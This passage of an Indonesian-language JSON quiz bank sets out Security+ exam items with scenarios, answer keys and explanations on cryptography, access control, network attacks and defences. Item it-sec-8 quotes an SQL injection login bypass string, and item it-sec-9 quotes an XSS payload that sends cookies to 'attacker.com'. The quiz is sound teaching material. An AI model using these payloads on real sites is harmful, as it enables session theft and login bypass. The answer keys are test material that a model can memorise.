    "sourceRef": "CompTIA Security+ SY0-701: Chapter 6 (Applied Cryptography)",
    "scenario": "Saat mengonfigurasi sesi HTTPS dengan TLS 1.3, browser menggunakan kriptografi asimetris (seperti RSA atau ECDHE) untuk pertukaran kunci awal, kemudian beralih menggunakan AES-256 untuk mengenkripsi seluruh muatan data browsing.",
    "workedExample": {
      "kasusSerupa": "Metode enkripsi cepat yang menggunakan satu kunci rahasia yang sama persis untuk proses mengunci dan membuka pesan.",
      "jawabanBenarContoh": "Enkripsi Simetris (Symmetric Encryption, contoh: AES-256).",
      "nalarBayi": "Kriptografi simetris mengandalkan satu kunci bersama yang harus dijaga ketat oleh pengirim dan penerima."
    },
    "question": "Ciri utama apakah yang membedakan algoritma enkripsi Asimetris (Public Key Cryptography) dari algoritma Simetris?",
    "options": [
      "Menggunakan sepasang kunci berbeda: Public Key untuk enkripsi dan Private Key untuk dekripsi",
      "Tidak pernah memerlukan proses komputasi matematika rumit",
      "Kecepatan prosesnya 1000 kali lebih kencang dibanding enkripsi simetris",
      "Hanya memerlukan satu kunci rahasia bersama untuk kedua proses"
    ],
    "correctIndex": 0,
    "explanation": "Kriptografi asimetris menggunakan pasangan kunci matematis terkait: Public Key (dibagikan secara bebas untuk enkripsi) dan Private Key (disimpan sangat rahasia oleh pemilik untuk dekripsi atau tanda tangan digital).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-4",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Integritas Data dan Hashing Satu Arah (One-Way Hash)",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 6 (Cryptographic Concepts)",
    "scenario": "Administrator sistem keamanan ingin menyimpan kata sandi pengguna di database. Tim pengembang mengusulkan agar password TIDAK disimpan dalam bentuk teks enkripsi yang bisa didekripsi kembali, melainkan diubah menjadi ringkasan matematis satu arah (one-way digest).",
    "workedExample": {
      "kasusSerupa": "Mengembalikan pesan teks terenkripsi (ciphertext) menjadi teks asli yang dapat dibaca kembali (plaintext) menggunakan kunci rahasia.",
      "jawabanBenarContoh": "Proses Dekripsi (Decryption) pada kriptografi reversibel.",
      "nalarBayi": "Enkripsi dapat didekripsi kembali dengan kunci."
    },
    "question": "Apakah sifat fundamental yang membedakan fungsi Hashing kriptografis (seperti SHA-256) dari Enkripsi biasa?",
    "options": [
      "Hashing selalu dapat dikembalikan ke teks asli menggunakan kunci privat",
      "Output hashing ukurannya berubah-ubah tergantung panjang inputnya",
      "Hashing bersifat satu arah (irreversible) dan menghasilkan output berukuran tetap tanpa kemampuan dekripsi balik",
      "Hashing memerlukan sertifikat digital CA pihak ketiga"
    ],
    "correctIndex": 2,
    "explanation": "Fungsi hash adalah algoritma satu arah (one-way function) yang memetakan data dengan ukuran sembarang ke string berukuran tetap (hash value). Karakteristik utamanya adalah tidak dapat didekripsi kembali (non-reversible).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-5",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Kategori Faktor Autentikasi dalam Multi-Factor Authentication (MFA)",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 5 (Identity and Access Management)",
    "scenario": "Sebuah aplikasi perbankan mengharuskan nasabah memasukkan kata sandi (Password), lalu memindai sidik jari (Biometrik), dan memasukkan kode token dari aplikasi authenticator di smartphone.",
    "workedExample": {
      "kasusSerupa": "Menggunakan dua buah kata sandi yang berbeda dari akun yang sama sebagai syarat login (kategori faktor yang identik).",
      "jawabanBenarContoh": "Bukan Multi-Factor (karena keduanya masih berada dalam kategori yang sama: 'Something you know').",
      "nalarBayi": "Keamanan berlapis mensyaratkan kombinasi dua faktor autentikasi independen agar proteksi akun maksimal."
    },
    "question": "Manakah kombinasi yang benar-benar memenuhi kriteria Multi-Factor Authentication (MFA) dengan menggunakan DUA FAKTOR DARI KATEGORI YANG BERBEDA?",
    "options": [
      "Kata sandi akun ditambah kode PIN 6 angka rahasia",
      "Dua kata sandi berbeda untuk login dan konfirmasi",
      "Nama ibu kandung ditambah tanggal lahir pribadi",
      "Kata sandi akun (Something you know) ditambah pemindaian sidik jari (Something you are)"
    ],
    "correctIndex": 3,
    "explanation": "MFA sejati mensyaratkan kombinasi dari kategori faktor yang berbeda: Something you know (kata sandi/PIN), Something you have (token hardware/smartphone/OTP), dan Something you are (biometrik/sidik jari/retina).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-6",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Penerapan Prinsip Hak Akses Terkecil (Principle of Least Privilege)",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 5 (Access Control Principles)",
    "scenario": "Saat seorang staf baru di departemen pemasaran masuk kerja, administrator sistem hanya memberikan hak akses baca pada folder promosi dan menolak seluruh akses ke folder keuangan dan hak instalasi software sistem.",
    "workedExample": {
      "kasusSerupa": "Memberikan seluruh karyawan kantor hak akses setara Administrator demi kepraktisan kerja harian.",
      "jawabanBenarContoh": "Pelanggaran prinsip keamanan (Excessive Privilege / Akses Berlebih yang sangat berisiko).",
      "nalarBayi": "Pola analisis kasus serupa: Menelaah memberikan seluruh karyawan kantor hak akses setara administrator demi kepraktisan kerja harian. untuk mengidentifikasi solusi yang tepat secara bertahap."
    },
    "question": "Prinsip keamanan akses manakah yang menyatakan bahwa pengguna atau proses hanya boleh diberikan hak izin minimum mutlak yang diperlukan untuk menyelesaikan tugas pekerjaannya?",
    "options": [
      "Principle of Least Privilege",
      "Separation of Duties",
      "Discretionary Override",
      "Implicit Deny All Access"
    ],
    "correctIndex": 0,
    "explanation": "Principle of Least Privilege (PoLP) membatasi izin pengguna hanya pada sumber daya yang benar-benar diperlukan untuk pekerjaannya. Ini meminimalkan kerusakan jika akun tersebut disusupi oleh penyerang.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-7",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Arsitektur Keamanan Modern: Paradigma Zero Trust (NIST SP 800-207)",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 2 (Architecture and Design)",
    "scenario": "Perusahaan meninggalkan model keamanan tradisional lama (Castle-and-Moat) yang menganggap semua perangkat di dalam jaringan kabel LAN kantor terpercaya secara otomatis. Perusahaan kini mewajibkan verifikasi ketat untuk SETIAP akses, kapan pun dan dari mana pun.",
    "workedExample": {
      "kasusSerupa": "Model keamanan perimeter lama yang berasumsi bahwa siapa pun yang berada di dalam jaringan kabel kantor otomatis dapat dipercaya.",
      "jawabanBenarContoh": "Model Keamanan Perimeter Tradisional (Castle-and-Moat).",
      "nalarBayi": "Arsitektur keamanan tradisional mengandalkan perimeter dinding luar seperti benteng kuno."
    },
    "question": "Apakah prinsip dasar filosofi keamanan jaringan modern yang dianut oleh model arsitektur Zero Trust?",
    "options": [
      "Trust based on static IP address whitelist",
      "Trust everyone inside the local perimeter",
      "Verify once during morning login and trust all day",
      "Never trust, always verify (Jangan pernah percaya, selalu verifikasi)"
    ],
    "correctIndex": 3,
    "explanation": "Zero Trust Architecture (ZTA) beroperasi dengan filosofi 'Never Trust, Always Verify'. Akses dievaluasi secara dinamis berdasarkan identitas, status keamanan perangkat, dan konteks pada setiap permintaan akses tanpa memedulikan lokasi jaringan.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-8",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Pencegahan Serangan SQL Injection: Prepared Statements & Parameterized Queries",
    "sourceRef": "SQL Antipatterns / CompTIA Security+ SY0-701: Chapter 7 (Application Security)",
    "scenario": "Aplikasi web toko online rentan terhadap serangan di mana hacker memasukkan input `' OR '1'='1` ke dalam kolom login untuk memotong autentikasi password. Tim insinyur perangkat lunak harus memperbaiki kode backend database.",
    "workedExample": {
      "kasusSerupa": "Menggabungkan input formulir teks pengguna langsung ke dalam string perintah SQL tanpa validasi.",
      "jawabanBenarContoh": "Dynamic SQL Concatenation — celah kerentanan fatal yang memicu serangan SQL Injection.",
      "nalarBayi": "Pola analisis kasus serupa: Menelaah menggabungkan input formulir teks pengguna langsung ke dalam string perintah sql tanpa validasi. untuk mengidentifikasi solusi yang tepat secara bertahap."
    },
    "question": "Teknik pengkodean backend database manakah yang paling efektif dan menjadi pertahanan utama terhadap serangan SQL Injection?",
    "options": [
      "Menyembunyikan tombol submit di halaman login",
      "Parameterized Queries / Prepared Statements",
      "Mengganti database MySQL ke database lain",
      "Menambah panjang kolom password di tabel database"
    ],
    "correctIndex": 1,
    "explanation": "Parameterized Queries (Prepared Statements) memastikan database memperlakukan input pengguna selalu sebagai data literal dan tidak pernah menginterpretasikannya sebagai sintaks perintah SQL yang dapat dieksekusi.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-9",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Serangan Cross-Site Scripting (XSS) dan Sanitasi Output",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 7 (Software Vulnerabilities)",
    "scenario": "Seorang penyerang memasukkan tag skrip JavaScript `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` ke dalam kolom komentar blog kantor. Setiap pengunjung yang membaca halaman tersebut otomatis mengirimkan cookie sesi mereka ke penyerang.",
    "workedExample": {
      "kasusSerupa": "Serangan siber yang memanfaatkan sesi login pengguna yang sah untuk mengirim perintah transaksi palsu tanpa disadari korban.",
      "jawabanBenarContoh": "CSRF (Cross-Site Request Forgery) — memalsukan permintaan transaksi dari browser korban.",
      "nalarBayi": "CSRF memalsukan permintaan transaksi."
    },
    "question": "Jenis serangan aplikasi web manakah yang terjadi ketika kode skrip berbahaya (biasanya JavaScript) disuntikkan ke situs web terpercaya dan dieksekusi di peramban pengguna lain?",
    "options": [
      "Directory Traversal",
      "Buffer Overflow",
      "Cross-Site Request Forgery (CSRF)",
      "Cross-Site Scripting (XSS)"
    ],
    "correctIndex": 3,
    "explanation": "Cross-Site Scripting (XSS) memungkinkan penyerang menyuntikkan skrip sisi klien ke halaman web yang dilihat oleh pengguna lain, berpotensi mencuri sesi cookie atau mengalihkan pengunjung ke situs phishing.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-10",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Mitigasi Ancaman Ransomware dengan Cadangan Terisolasi (Air-Gapped Backup)",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 4 (Mitigating Threats)",
    "scenario": "Perusahaan logistik diserang malware yang mengenkripsi seluruh file dokumen kantor dengan ekstensi `.locked` dan menuntut tebusan mata uang kripto 10 Bitcoin untuk kunci pembukanya. Malware bahkan mencari dan menghapus seluruh shared folder backup di jaringan.",
    "workedExample": {
      "kasusSerupa": "Menyimpan file cadangan data di drive eksternal yang terus terhubung ke jaringan lokal komputer kantor.",
      "jawabanBenarContoh": "Hot Backup / Network Backup — mudah diakses namun rentan ikut terinfeksi bila ransomware menyebar di LAN.",
      "nalarBayi": "Menyimpan salinan berkas cadangan di media eksternal membantu memulihkan data jika komputer utama mengalami kerusakan."
    },
    "question": "Strategi pencadangan data manakah yang paling efektif menjamin tersedianya data bersih saat serangan ransomware melumpuhkan seluruh jaringan komputer kantor?",
    "options": [
      "Air-Gapped Backup (Cadangan terisolasi fisik tanpa koneksi jaringan)",
      "Menyalin file ke folder yang sama di desktop",
      "Mengganti ekstensi file .locked menjadi .docx secara manual",
      "Membayar tebusan bitcoin ke rekening hacker"
    ],
    "correctIndex": 0,
    "explanation": "Air-Gapped Backup adalah salinan data yang terputus secara fisik dan elektronik dari seluruh jaringan komputer. Ini mencegah ransomware mengakses, mengenkripsi, atau menghapus repositori cadangan.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-11",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Karakteristik Firewall: Stateful Packet Inspection (SPI)",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 6 (Network Security Appliances)",
    "scenario": "Firewall kantor dikonfigurasi untuk mengizinkan pengguna internal melakukan browsing web (port 80/443). Ketika server web luar mengirimkan balasan paket data kembali, firewall secara otomatis mengizinkannya masuk karena mengenali bahwa paket tersebut adalah respons sah dari sesi yang diinisiasi oleh pengguna dari dalam.",
    "workedExample": {
      "kasusSerupa": "Firewall generasi pertama yang hanya memeriksa header paket data tanpa mengingat status riwayat koneksi sebelumnya.",
      "jawabanBenarContoh": "Stateless Packet Filtering Firewall — memeriksa aturan izin murni per paket secara terisolasi.",
      "nalarBayi": "Stateless hanya membaca per paket."
    },
    "question": "Teknologi firewall manakah yang melacak konteks dan status sesi koneksi aktif (State Table) untuk mengizinkan paket balasan masuk yang sesuai secara dinamis?",
    "options": [
      "Stateful Packet Inspection (SPI) Firewall",
      "Analog Circuit Switch",
      "Hub Repeater Filter",
      "Stateless Packet Filter biasa"
    ],
    "correctIndex": 0,
    "explanation": "Stateful Firewall memelihara tabel status koneksi TCP/UDP. Firewall mengetahui apakah suatu paket merupakan paket pembuka koneksi baru atau merupakan bagian dari sesi yang sudah ada dan diizinkan sebelumnya.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-12",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Serangan Man-in-the-Middle melalui Keracunan ARP (ARP Poisoning)",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 3 (Network Attacks)",
    "scenario": "Di jaringan Wi-Fi kafe, hacker mengirimkan pesan ARP reply palsu secara terus menerus ke laptop korban, mengklaim bahwa alamat MAC laptop hacker adalah alamat MAC dari router default gateway kafe.",
    "workedExample": {
      "kasusSerupa": "Memalsukan alamat IP pengirim pada paket data internet agar tampak berasal dari server terpercaya.",
      "jawabanBenarContoh": "IP Address Spoofing — manipulasi header IP pengirim.",
      "nalarBayi": "Manipulasi paket alamat IP pada lapisan network layer mencoba mengelabui filter firewall luar."
    },
    "question": "Jenis serangan Layer 2 manakah yang mengeksploitasi ketiadaan autentikasi pada protokol ARP dengan cara mengirimkan pesan balasan palsu untuk membelokkan lalu lintas data (Man-in-the-Middle)?",
    "options": [
      "MAC Flooding",
      "BGP Hijacking",
      "DNS Sinkholing",
      "ARP Spoofing / ARP Poisoning"
    ],
    "correctIndex": 3,
    "explanation": "ARP Poisoning melibatkan pengiriman balasan ARP palsu melalui LAN untuk mengaitkan alamat IP gateway dengan alamat MAC penyerang, menempatkan penyerang di tengah-tengah percakapan (Man-in-the-Middle).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-13",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Otoritas Sertifikat Digital: Certificate Authority (CA) dalam PKI",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 6 (Public Key Infrastructure)",
    "scenario": "Saat pengguna membuka situs e-commerce bank, peramban Chrome menampilkan gembok hijau aman. Pengguna dapat meyakini bahwa kunci publik yang diterima benar-benar milik bank resmi dan bukan milik hacker penipu di tengah jalan.",
    "workedExample": {
      "kasusSerupa": "Membuat sertifikat digital buatan sendiri (self-signed certificate) untuk keperluan pengujian server internal.",
      "jawabanBenarContoh": "Self-Signed Certificate — sertifikat tanpa verifikasi pihak ketiga yang memunculkan peringatan keamanan di browser.",
      "nalarBayi": "Sertifikat yang diterbitkan secara mandiri cocok untuk pengujian lokal namun akan memunculkan peringatan keamanan pada peramban publik."
    },
    "question": "Entitas pihak ketiga terpercaya manakah dalam Public Key Infrastructure (PKI) yang bertugas memverifikasi identitas pemilik domain dan menerbitkan sertifikat digital bertanda tangan kriptografis?",
    "options": [
      "Internet Service Provider (ISP)",
      "DNS Root Registrar",
      "Certificate Authority (CA)",
      "Proxy Server Caching"
    ],
    "correctIndex": 2,
    "explanation": "Certificate Authority (CA) adalah pihak ketiga tepercaya yang menerbitkan sertifikat digital yang mengikat identitas sebuah entitas (seperti situs web) dengan kunci publiknya, membentuk dasar rantai kepercayaan PKI.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-14",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Mitigasi Serangan DoS / DDoS: SYN Flood dan Mekanisme SYN Cookies",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 3 (Denial-of-Service Attacks)",
    "scenario": "Server web e-commerce dibanjiri jutaan paket TCP bertanda flag SYN dari ribuan alamat IP spoofing palsu. Server mengalokasikan memori untuk menunggu balasan ACK yang tidak pernah datang, hingga antrean memori koneksi (backlog queue) habis dan server tumbang.",
    "workedExample": {
      "kasusSerupa": "Membanjiri server dengan paket ping ICMP Echo Request berukuran raksasa hingga bandwidth saluran internet habis.",
      "jawabanBenarContoh": "Ping Flood / ICMP Flood DDoS Attack.",
      "nalarBayi": "Banjir paket pesan echo ICMP dalam volume masif dapat menyumbat total kapasitas pipa bandwidth."
    },
    "question": "Serangan penolakan layanan (DoS) manakah yang mengeksploitasi jabat tangan TCP 3-Way Handshake dengan mengirimkan rentetan paket pembuka tanpa pernah menyelesaikan proses konfirmasi akhir?",
    "options": [
      "SQL Truncation",
      "Ping of Death",
      "Smurf Attack ICMP",
      "TCP SYN Flood"
    ],
    "correctIndex": 3,
    "explanation": "SYN Flood mengeksploitasi proses TCP handshake dengan mengirim banyak paket SYN tanpa pernah mengirim ACK balasan. Server menghabiskan sumber daya tabel half-open connection dan menolak koneksi sah berikutnya.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-15",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Perlindungan Terhadap Rainbow Table: Teknik Penggaraman (Salting)",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 6 (Password Protections)",
    "scenario": "Dalam perancangan sistem autentikasi pengguna, arsitek keamanan mewajibkan penambahan string acak kriptografis unik (Salt) sepanjang 16 byte ke setiap kata sandi sebelum dilewatkan ke fungsi hash lambat (seperti bcrypt atau Argon2).",
    "workedExample": {
      "kasusSerupa": "Menghitung hash dari kata sandi polos tanpa penambahan karakter acak (Plain Hashing).",
      "jawabanBenarContoh": "Hashing biasa — rentan dibobol menggunakan tabel kamus hash siap pakai (Rainbow Table).",
      "nalarBayi": "Penyimpanan password dengan fungsi hash satu arah memastikan teks asli tidak dapat dilihat langsung dalam tabel."
    },
    "question": "Apa tujuan utama dari penambahan nilai acak 'Salt' pada kata sandi sebelum proses hashing dilakukan?",
    "options": [
      "Mengubah protokol transmisi HTTP menjadi HTTPS secara otomatis",
      "Mengurangi waktu komputasi verifikasi login menjadi nol milidetik",
      "Membuat nilai hash unik meskipun kata sandinya identik, menggagalkan serangan berbasis Rainbow Table",
      "Memungkinkan kata sandi dapat dibaca kembali oleh administrator sistem saat lupa"
    ],
    "correctIndex": 2,
    "explanation": "Salting menambahkan deretan bit acak ke kata sandi sebelum di-hash. Ini mencegah serangan kamus pramenghitung (Rainbow Table Attacks) dan memastikan dua akun dengan password identik memiliki nilai hash berbeda di database.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-16",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Evolusi Keamanan Endpoint: Antivirus Tradisional vs Solusi EDR",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 4 (Endpoint Security)",
    "scenario": "Antivirus tradisional kantor gagal mendeteksi serangan siber 'Living off the Land' (LotL) karena penyerang tidak menyalin file virus berekstensi .exe, melainkan mengeksekusi skrip PowerShell terenkripsi langsung di memori untuk mencuri kredensial.",
    "workedExample": {
      "kasusSerupa": "Perangkat lunak antivirus lawas yang hanya mendeteksi virus berdasarkan kecocokan pola tanda tangan berkas (signature database).",
      "jawabanBenarContoh": "Legacy Antivirus (AV Berbasis Signature) — gagal mendeteksi malware varian baru atau zero-day.",
      "nalarBayi": "Antivirus lama mengandalkan database tanda tangan. Solusi modern yang memantau perilaku proses secara langsung dan mampu merespons insiden secara otomatis adalah EDR!."
    },
    "question": "Solusi keamanan endpoint modern manakah yang secara proaktif memantau perilaku sistem (behavioral telemetry), mendeteksi ancaman tanpa file (fileless malware), dan mampu mengisolasi perangkat yang terinfeksi secara otomatis?",
    "options": [
      "Host Intrusion Repeater",
      "Signature-based Antivirus biasa",
      "Hardware Firewall SOHO",
      "EDR (Endpoint Detection and Response)"
    ],
    "correctIndex": 3,
    "explanation": "EDR (Endpoint Detection and Response) menyediakan pemantauan perilaku berkelanjutan, analisis forensik insiden, dan kemampuan respons otomatis (seperti mengisolasi mesin dari jaringan) untuk menangkal ancaman canggih.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-17",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Korelasi dan Analisis Log Terpusat dengan Sistem SIEM",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 4 (Security Operations and Monitoring)",
    "scenario": "Pusat Operasi Keamanan (SOC) perusahaan menerima ribuan log setiap detik dari firewall, server Windows, switch Cisco, dan aplikasi cloud. Analis membutuhkan platform terpusat yang mampu mengorelasikan pola anomali secara lintas perangkat.",
    "workedExample": {
      "kasusSerupa": "Membaca catatan log aktivitas server satu per satu langsung di masing-masing mesin komputer secara terpisah.",
      "jawabanBenarContoh": "Manual Local Log Inspection — tidak efisien dan rentan dimanipulasi peretas yang berhasil masuk.",
      "nalarBayi": "Pemeriksaan manual file log server satu per satu membutuhkan waktu lama saat pelacakan insiden."
    },
    "question": "Platform keamanan terpusat manakah yang berfungsi mengumpulkan (aggregation), mengorelasikan (correlation), dan menganalisis log dari berbagai sistem guna mendeteksi ancaman keamanan secara komprehensif?",
    "options": [
      "Load Balancer Round Robin",
      "SIEM (Security Information and Event Management)",
      "NTP Time Synchronization",
      "DHCP Server Pool"
    ],
    "correctIndex": 1,
    "explanation": "SIEM (Security Information and Event Management) menggabungkan SIM (manajemen informasi) dan SEM (manajemen peristiwa), memberikan analisis waktu nyata terhadap peringatan keamanan yang dihasilkan oleh aplikasi dan perangkat keras jaringan.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-18",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Metrik Rencana Pemulihan Bencana (DRP): RTO vs RPO",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 8 (Resilience and Business Continuity)",
    "scenario": "Dalam audit kelangsungan bisnis (Business Continuity Plan), dewan direksi menetapkan bahwa jika pusat data utama terkena banjir, sistem pemesanan online harus kembali normal dalam waktu maksimal 2 jam, dan kehilangan data transaksi tidak boleh lebih dari 15 menit.",
    "workedExample": {
      "kasusSerupa": "Menghitung batas toleransi maksimal jumlah kehilangan data transaksi yang dapat diterima bisnis saat bencana terjadi.",
      "jawabanBenarContoh": "RPO (Recovery Point Objective) — batas mundur toleransi kehilangan data diukur dalam hitungan menit/jam.",
      "nalarBayi": "RPO mengukur data yang hilang."
    },
    "question": "Metrik perencanaan pemulihan bencana manakah yang mendefinisikan batas waktu maksimum yang diizinkan untuk memulihkan fungsi sistem dan proses bisnis kembali beroperasi normal setelah bencana?",
    "options": [
      "MTBF (Mean Time Between Failures)",
      "RPO (Recovery Point Objective)",
      "RTO (Recovery Time Objective)",
      "MTTR (Mean Time to Repair)"
    ],
    "correctIndex": 2,
    "explanation": "RTO (Recovery Time Objective) adalah durasi waktu target maksimum di mana proses bisnis atau sistem TI harus dipulihkan setelah kegagalan atau bencana demi mencegah dampak yang tidak dapat diterima.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-19",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Peningkatan Keamanan Nirkabel: Protokol WPA3 dan SAE",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 6 (Wireless Security Protocols)",
    "scenario": "Standar keamanan Wi-Fi lama (WPA2-Personal) rentan terhadap serangan penangkapan jabat tangan 4 arah (4-way handshake capture) yang kemudian di-crack secara offline menggunakan dictionary attack oleh hacker.",
    "workedExample": {
      "kasusSerupa": "Protokol keamanan Wi-Fi generasi kedua yang rentan terhadap serangan penangkapan 4-way handshake secara offline.",
      "jawabanBenarContoh": "WPA2 dengan Pre-Shared Key (PSK).",
      "nalarBayi": "Protokol keamanan generasi lama memiliki celah terhadap teknik penyadapan offline saat proses pertukaran kunci awal."
    },
    "question": "Protokol pertukaran kunci baru manakah yang diperkenalkan pada standar keamanan Wi-Fi WPA3 untuk menggantikan Pre-Shared Key (PSK) dan melindungi dari serangan kamus offline?",
    "options": [
      "TKIP Sequence Counter",
      "WPS Push Button",
      "WEP RC4 Keying",
      "SAE (Simultaneous Authentication of Equals)"
    ],
    "correctIndex": 3,
    "explanation": "WPA3 menggantikan PSK dengan SAE (Simultaneous Authentication of Equals), varian dari jabat tangan Dragonfly. SAE kebal terhadap serangan kamus offline dan memberikan forward secrecy bahkan jika sandi sangat sederhana.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-sec-20",
    "category": "4. Pertahanan Siber & Keamanan IT (Security+ SY0-701)",
    "title": "Keamanan Fisik: Serangan Rekayasa Sosial Tailgating / Piggybacking",
    "sourceRef": "CompTIA Security+ SY0-701: Chapter 3 (Physical Security Controls)",
    "scenario": "Seorang pria berpakaian seragam kurir pengantar paket membawa kotak kardus besar di kedua tangannya. Pria tersebut meminta karyawan kantor yang baru saja men-tap kartu akses ID card untuk menahan pintu kaca tetap terbuka agar kurir bisa ikut masuk ke dalam area aman tanpa tapping kartu.",
    "workedExample": {
      "kasusSerupa": "Menyusup masuk ke gedung kantor dengan cara menyamar sebagai petugas kurir pengantar paket berompi resmi.",
      "jawabanBenarContoh": "Impersonation / Pretexting — menciptakan identitas palsu untuk mengelabui petugas keamanan.",
      "nalarBayi": "Impersonation adalah menyamar."
    },
    "question": "Taktik rekayasa sosial fisik manakah di mana orang yang tidak berwenang membuntuti orang yang memiliki otorisasi sah agar dapat menyusup ke dalam fasilitas gedung yang terkunci?",
    "options": [
      "Dumpster Diving",
      "Baiting",
      "Shoulder Surfing",
      "Tailgating (Piggybacking)"
    ],
    "correctIndex": 3,
    "explanation": "Tailgating terjadi ketika individu tanpa otorisasi mengikuti pengguna yang sah melewati titik kontrol akses fisik (pintu kartu pintar) tanpa menyajikan kredensial mereka sendiri, sering kali memanfaatkan kesopanan manusia.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-1",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Analisis Kompleksitas Waktu: Notasi Big-O",
    "sourceRef": "Grokking Algorithms: Chapter 1 (Introduction to Algorithms)",
    "scenario": "Seorang programmer membandingkan dua algoritma pencarian pada daftar data berisi 1.000.000 (satu juta) data yang sudah terurut rapi. Algoritma A membutuhkan maksimal 1.000.000 langkah, sedangkan Algoritma B hanya membutuhkan maksimal 20 langkah.",
    "workedExample": {
      "kasusSerupa": "Menghitung kompleksitas waktu pencarian elemen pada array acak tak berurut yang harus memeriksa setiap data satu per satu dari awal.",
      "jawabanBenarContoh": "O(n) - Waktu Linear (Linear Search).",
      "nalarBayi": "Linear Search butuh O(n) karena membaca satu-satu."
    },
    "question": "Manakah notasi Big-O yang merepresentasikan kompleksitas waktu pencarian pada Binary Search dalam kasus terburuk (worst-case)?",
    "options": [
      "O(1)",
      "O(n^2)",
      "O(log n)",
      "O(n)"
    ],
    "correctIndex": 2,
    "explanation": "Binary Search membelah ruang pencarian menjadi separuh pada setiap langkah iterasi. Oleh karena itu, jumlah operasi yang dibutuhkan berbanding lurus dengan logaritma basis 2 dari n: O(log n).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-2",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Syarat Mutlak Algoritma Binary Search: Data Terurut",
    "sourceRef": "Grokking Algorithms: Chapter 1 (Binary Search)",
